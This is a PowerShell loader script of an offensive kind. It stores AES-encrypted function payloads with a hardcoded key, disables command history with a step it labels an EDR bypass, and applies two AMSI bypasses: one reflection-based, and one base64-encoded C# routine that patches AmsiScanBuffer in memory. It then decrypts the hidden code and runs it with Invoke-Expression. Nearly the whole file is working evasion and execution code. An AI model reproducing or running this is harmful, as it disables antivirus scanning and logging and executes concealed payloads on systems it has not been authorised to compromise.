$EncFunc0 = ("txYtWDo1wd0C1NbmzB5RuA==", "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")
$EncFunc1 = ("idSmLHhCp4tHxU3jPi3vTw==", "PKx46mJn4lbQ4ibJXvGWU4tM42cK+eD2qLjnt+S8ryeRQ+o0sMc6T42xy4VJGVzo")
$EncryptedFunctions = @($EncFunc0,$EncFunc1)
$Password="!xcgf!9oEW"
$Salt="3M72?TPp>_"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)

#AMSI Bypass 2
$AMSIBypass2encoded = "dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoADQAKAG4AYQBtAGUAcwBwAGEAYwBlACAAUgBhAG4AZABvAG0ATgBhAG0AZQBzAHAAYQBjAGUADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABSAGEAbgBkAG8AbQBDAGwAYQBzAHMADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAiACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgASQBuAHQAUAB0AHIAIABoAE0AbwBkAHUAbABlACwAIABzAHQAcgBpAG4AZwAgAHAAcgBvAGMATgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoAHMAdAByAGkAbgBnACAAbgBhAG0AZQApADsADQAKACAAIAAgACAAIAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAbAAzADIAIgApAF0ADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIASwBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAARQBuAHQAcgB5AFAAbwBpAG4AdAAgAD0AIAAiAFIAdABsAE0AbwB2AGUATQBlAG0AbwByAHkAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAZgBhAGwAcwBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAATQBvAHYAZQBNAGUAbQBvAHIAeQAoAEkAbgB0AFAAdAByACAAZABlAHMAdAAsACAASQBuAHQAUAB0AHIAIABzAHIAYwAsACAAaQBuAHQAIABzAGkAegBlACkAOwANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAFIAYQBuAGQAbwBtAEYAdQBuAGMAdABpAG8AbgAoACkADQAKACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAYQByAGcAZQB0AEQATABMACAAPQAgAEwAbwBhAGQATABpAGIAcgBhAHIAeQAoACIAYQBtAHMAaQAuAGQAbABsACIAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgAgAFQAbwB0AGEAbABsAHkATgBvAHQAVABoAGEAdABCAHUAZgBmAGUAcgBZAG8AdQBSAEwAbwBvAGsAaQBuAGcARgBvAHIAUAB0AHIAIAA9ACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzACgAVABhAHIAZwBlAHQARABMAEwALAAgACIAQQBtAHMAaQAiACAAKwAgACIAUwBjAGEAbgAiACAAKwAgACIAQgB1AGYAZgBlAHIAIgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABVAEkAbgB0AFAAdAByACAAZAB3AFMAaQB6AGUAIAA9ACAAKABVAEkAbgB0AFAAdAByACkANQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AGkAbgB0ACAAWgBlAHIAbwAgAD0AIAAwADsADQAKACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACwAIABkAHcAUwBpAHoAZQAsACAAMAB4ADQAMAAsACAAbwB1AHQAIABaAGUAcgBvACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIABvAG4AZQAgAD0AIAB7ACAAMAB4ADMAMQAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAQgB5AHQAZQBbAF0AIAB0AHcAbwAgAD0AIAB7ACAAMAB4AGYAZgAsACAAMAB4ADkAMAAgAH0AOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAHQAIABsAGUAbgBnAHQAaAAgAD0AIABvAG4AZQAuAEwAZQBuAGcAdABoACAAKwAgAHQAdwBvAC4ATABlAG4AZwB0AGgAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYgB5AHQAZQBbAF0AIABzAHUAbQAgAD0AIABuAGUAdwAgAGIAeQB0AGUAWwBsAGUAbgBnAHQAaABdADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG8AbgBlAC4AQwBvAHAAeQBUAG8AKABzAHUAbQAsADAAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHcAbwAuAEMAbwBwAHkAVABvACgAcwB1AG0ALABvAG4AZQAuAEwAZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAASQBuAHQAUAB0AHIAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACAAPQAgAE0AYQByAHMAaABhAGwALgBBAGwAbABvAGMASABHAGwAbwBiAGEAbAAoADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AYQByAHMAaABhAGwALgBDAG8AcAB5ACgAcwB1AG0ALAAgADAALAAgAHUAbgBtAGEAbgBhAGcAZQBkAFAAbwBpAG4AdABlAHIALAAgADMAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE0AbwB2AGUATQBlAG0AbwByAHkAKABUAG8AdABhAGwAbAB5AE4AbwB0AFQAaABhAHQAQgB1AGYAZgBlAHIAWQBvAHUAUgBMAG8AbwBrAGkAbgBnAEYAbwByAFAAdAByACAAKwAgADAAeAAwADAAMQBiACwAIAB1AG4AbQBhAG4AYQBnAGUAZABQAG8AaQBuAHQAZQByACwAIAAzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAfQANAAoAfQA="
$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($AMSIBypass2encoded))
Add-Type -TypeDefinition $AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
if($Password -and $Salt)
{
$Index = 0
foreach($ef in $EncryptedFunctions)
{

[byte[]]$CipherText = [Convert]::FromBase64String($ef[1])
[byte[]]$InitVector = [Convert]::FromBase64String($ef[0])

$AES = [System.Security.Cryptography.Aes]::Create()

$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)
$AES.IV = $InitVector

$AESDecryptor = $AES.CreateDecryptor()

$MemoryStream = New-Object System.IO.MemoryStream($CipherText,$True)
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
$StreamReader = New-Object System.IO.StreamReader($CryptoStream)

$Message = $StreamReader.ReadToEnd()

$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

try {$Message | Invoke-Expression } catch { Write-Warning "Error loading function number $Index. Beware that this only affects the mentioned function so everything else should work fine." }

$Index++
}
}
